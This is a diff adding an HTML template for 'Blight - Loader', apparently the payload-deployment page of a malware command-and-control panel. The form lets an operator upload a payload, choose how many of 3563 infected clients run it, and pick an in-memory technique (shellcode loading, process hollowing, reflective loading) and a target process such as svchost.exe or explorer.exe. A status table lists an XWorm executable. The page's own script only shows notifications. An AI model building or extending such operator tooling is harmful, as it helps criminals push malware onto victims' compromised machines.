@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Blight - Loader</title>
+    <link rel="stylesheet" href="{{ url_for('static',filename='css/stylesheet.css') }}" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
+    />
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="{{ url_for('static',filename='js/toast.js') }}"></script>
+    <script src="{{ url_for('static',filename='js/rclickmenu.js') }}"></script>
+  </head>
+  <body>
+    <nav class="navbar">
+      <ul>
+        <img class="logo" src="{{ url_for('static',filename='misc/logo.png') }}" />
+        <li>
+          <a href="clients"><i class="fas fa-user"></i></a>
+        </li>
+        <li>
+          <a href="loader"><i class="fas fa-inbox"></i></a>
+        </li>
+        <li>
+          <a href="logs"><i class="fas fa-envelope"></i></a>
+        </li>
+        <li>
+          <a href="builder"><i class="fas fa-screwdriver-wrench"></i></a>
+        </li>
+        <li>
+          <a href="#"><i class="fas fa-cog"></i></a>
+        </li>
+        
+      </ul>
+    </nav>
+
+      <div class="menusex">
+      <input type="file" id="myFile" name="filename" />
+      <input placeholder="Amount? (out of 3563)" />
+
+      <select>
+        <option>Shellcode Loading</option>
+        <option>Donut Conversion</option>
+        <option>Proccess Hollowing</option>
+        <option>Reflective Loading</option>
+      </select>
+      <select>
+        <option>explorer.exe</option>
+        <option>calc.exe</option>
+        <option>msbuild.exe</option>
+        <option>svchost.exe</option>
+      </select>
+      <select>
+        <option>Non-Recursive</option>
+        <option>Recursive</option>
+      </select>
+      <button onclick='launch_toast("Load created, wait for executions", "fa-solid fa-wand-magic-sparkles")'>
+        <i class="fa-solid fa-upload"></i>
+      </button>
+    </div>
+
+    <br>
+    
+    <div class="section">
+      <table>
+        <tbody>
+          <tr>
+            <th>Progress</th>
+            <th></th>
+            <th>Execution Type</th>
+            <th>Payload Name</th>
+            <th>Time</th>
+          </tr>
+          <tr>
+            <td style="width: 15%" class="progress-bar-cell">
+              <div class="progress-bar">
+                <div class="progress" style="width: 50%"></div>
+              </div>
+            </td>
+            <td></td>
+            <td>Memory Execution</td>
+            <td>xworm_uncrypted.exe</td>
+            <td>36s Ago</td>
+          </tr>
+
+        </tbody>
+      </table>
+    </div>
+
+    <div id="custom-context-menu" style="display: none; position: absolute">
+      <ul>
+        <li onclick="delete_load('load_id')">Delete</li>
+      </ul>
+    </div>
+    <div id="toast-container"></div>     
+    <script>
+      function delete_load(load_id) {
+        launch_toast("Deleted load successfully", "fa-solid fa-check");
+      }
+
+    </script>
+  </body>
+</html>
